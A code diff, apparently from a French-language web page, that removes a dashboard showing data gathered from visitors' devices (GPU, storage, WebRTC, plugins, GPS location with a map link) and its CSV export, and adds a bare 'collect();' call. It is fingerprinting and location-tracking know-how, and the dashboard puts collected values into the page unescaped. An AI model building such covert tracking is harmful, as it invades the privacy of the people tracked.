-          ${d.gpu_renderer ? `<span class="tag p">${d.gpu_renderer.slice(0,30)}</span>` : ''}
-        </div>
-
-        <div class="grid">
-          <div class="info-item"><div class="info-key">OS</div><div class="info-val">${d.os || '—'}</div></div>
-          <div class="info-item"><div class="info-key">Navigateur</div><div class="info-val">${browser}${navVersion}</div></div>
-          <div class="info-item"><div class="info-key">Pixel ratio</div><div class="info-val">${d.pixel_ratio || '—'}</div></div>
-          <div class="info-item"><div class="info-key">Profondeur couleur</div><div class="info-val">${d.ecran_profondeur_couleur || '—'}</div></div>
-          <div class="info-item"><div class="info-key">Orientation</div><div class="info-val">${d.orientation || '—'}</div></div>
-          <div class="info-item"><div class="info-key">Langues dispo</div><div class="info-val">${d.langues_dispo || '—'}</div></div>
-          ${d.reseau_rtt_ms ? `<div class="info-item"><div class="info-key">Latence réseau</div><div class="info-val">${d.reseau_rtt_ms} ms</div></div>` : ''}
-          ${d.stockage_utilise_mb !== undefined ? `<div class="info-item"><div class="info-key">Stockage utilisé</div><div class="info-val">${d.stockage_utilise_mb} Mo / ${d.stockage_quota_mb} Mo</div></div>` : ''}
-          <div class="info-item"><div class="info-key">WebRTC</div><div class="info-val">${d.webrtc ? '✓' : '✗'}</div></div>
-          <div class="info-item"><div class="info-key">Notifications</div><div class="info-val">${d.notification_permission || '—'}</div></div>
-          ${hasGPS ? `<div class="info-item"><div class="info-key">GPS (±${d.gps_precision_m}m)</div><div class="info-val"><a href="${d.gps_maps}" target="_blank">Voir sur Maps ↗</a></div></div>` : ''}
-          <div class="info-item"><div class="info-key">Cookies</div><div class="info-val">${d.cookies_actives ? 'Activés' : 'Désactivés'}</div></div>
-          ${d.gpu_vendor ? `<div class="info-item"><div class="info-key">GPU vendor</div><div class="info-val">${d.gpu_vendor}</div></div>` : ''}
-          ${d.plugins ? `<div class="info-item"><div class="info-key">Plugins</div><div class="info-val">${d.plugins}</div></div>` : ''}
-        </div>
-
-        <div class="card-toggle">
-          <button class="toggle-btn" onclick="toggleRaw('${id}')">Voir JSON brut</button>
-        </div>
-        <div class="card-extra" id="extra-${id}">
-          <div class="raw-json">${JSON.stringify(d, null, 2)}</div>
-        </div>
-      </div>
-    `;
-  }).join('');
-}
-
-function toggleRaw(cardId) {
-  const el = document.getElementById('extra-' + cardId);
-  const btn = el.previousElementSibling.querySelector('button');
-  if (el.classList.toggle('open')) btn.textContent = 'Masquer JSON';
-  else btn.textContent = 'Voir JSON brut';
-}
-
-function exportCSV() {
-  if (!allDevices.length) return alert('Aucune donnée à exporter.');
-  const keys = [...new Set(allDevices.flatMap(({data:d}) => Object.keys(d)))];
-  const rows = [keys.join(',')];
-  allDevices.forEach(({data:d}) => {
-    rows.push(keys.map(k => {
-      const v = d[k] ?? '';
-      return '"' + String(v).replace(/"/g, '""') + '"';
-    }).join(','));
-  });
-  const blob = new Blob([rows.join('\n')], { type: 'text/csv;charset=utf-8;' });
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = `appareils_${new Date().toISOString().slice(0,10)}.csv`;
-  a.click();
-}
+collect();
 </script>
 </body>
 </html>
